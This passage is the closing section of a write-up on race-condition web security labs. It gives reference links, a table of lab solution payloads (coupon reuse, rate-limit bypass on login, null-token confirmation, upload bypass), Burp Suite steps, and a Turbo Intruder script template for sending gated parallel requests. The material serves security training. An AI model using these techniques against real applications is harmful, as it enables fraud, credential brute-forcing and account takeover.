    - https://www.kroll.com/en/insights/publications/cyber/race-condition-web-applications
    - Prevention strategies and best practices

11. **Race Condition Explained**
    - https://www.veracode.com/security/race-condition/
    - Comprehensive explanation with examples

12. **The Ultimate Guide to Race Condition Testing**
    - https://momentic.ai/resources/the-ultimate-guide-to-race-condition-testing-in-web-applications
    - Testing methodologies and tools

### Tools & Frameworks

13. **Turbo Intruder**
    - BApp Store: https://portswigger.net/bappstore
    - GitHub: https://github.com/PortSwigger/turbo-intruder
    - Extension for advanced race condition testing

14. **Burp Suite Professional**
    - https://portswigger.net/burp/pro
    - Required for single-packet attacks

15. **Race Condition Cheat Sheet**
    - https://0xn3va.gitbook.io/cheat-sheets/web-application/race-condition
    - Quick reference for exploitation techniques

### Research & Presentations

16. **New Techniques and Tools for Web Race Conditions**
    - https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions
    - Latest research from PortSwigger

17. **Black Hat USA 2023 Presentation**
    - "Smashing the State Machine" by James Kettle
    - Introduces partial construction race conditions

### Secure Coding Resources

18. **Secure Coding Guide: Race Conditions**
    - https://leopard-adc.pepas.com/documentation/Security/Conceptual/SecureCodingGuide/Articles/RaceConditions.html
    - Apple's guide to avoiding race conditions

19. **Race Condition Vulnerabilities - InfoSec**
    - https://www.infosecinstitute.com/resources/secure-coding/how-to-mitigate-race-conditions-vulnerabilities/
    - Mitigation strategies for developers

20. **Atomic Operations and Locks**
    - Language-specific documentation for atomic operations
    - Database transaction isolation level guides

### Community Resources

21. **Bug Bounty Reports**
    - HackerOne: Search for "race condition" vulnerabilities
    - Examples of real-world exploitation

22. **Medium Articles**
    - "The Chase for Time: Race Condition Vulnerabilities" (CVE-2024-6387)
    - https://medium.com/@yanivx32/the-chase-for-time-race-condition-vulnerabilities-and-how-to-exploit-them-a-live-example-from-c1cc66086617

### Standards & Guidelines

23. **Thread Safety Guidelines**
    - Language-specific concurrency documentation
    - Framework security best practices

24. **Database Isolation Levels**
    - PostgreSQL: SERIALIZABLE transaction isolation
    - MySQL: REPEATABLE READ considerations
    - Understanding ACID properties

---

## Appendix: Quick Reference

### Lab Solutions Summary

| Lab | Exploit Type | Key Payload | Success Indicator |
|-----|-------------|-------------|------------------|
| Limit Overrun | Discount reuse | 20x `POST /cart/coupon` | Multiple discounts applied |
| Rate Limit Bypass | Login brute-force | 100x `POST /login` with passwords | 302 redirect response |
| Multi-Endpoint | Cart manipulation | Parallel cart add + checkout | Expensive item purchased |
| Single-Endpoint | Email collision | Parallel email changes | Admin email in confirmation |
| Partial Construction | Null token | `POST /confirm?token[]=` | "Registration successful" |
| Time-Sensitive | Timestamp collision | Parallel reset requests | Identical tokens |
| File Upload | Validation bypass | Upload + 5x GET requests | 200 with file contents |

### Essential Burp Suite Commands

```
Create tab group: Right-click tab → "Add to new tab group"
Duplicate tab: Ctrl+Shift+D
Send parallel: Right-click group → "Send group in parallel (single-packet attack)"
Send to Turbo Intruder: Right-click request → Extensions → Turbo Intruder
Mark payload position: Highlight value → Right-click → "Payload position"
```

### Turbo Intruder Script Template

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i in range(20):
        engine.queue(target.req, str(i), gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Common HTTP/2 Request Format

```http
POST /endpoint HTTP/2
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

param1=value1&param2=value2
```

---

**Lab Completion Notes:**
- All labs tested with Burp Suite Professional 2023.12
- HTTP/2 single-packet attack used where available
- Average completion times assume familiarity with techniques
- Some labs require multiple attempts due to timing precision
- Turbo Intruder extension version: Latest from BApp Store

**Credits:**
- PortSwigger Web Security Academy
- James Kettle (@albinowax) - Original research
- OWASP Foundation - Security guidelines
- CWE/MITRE - Vulnerability classification
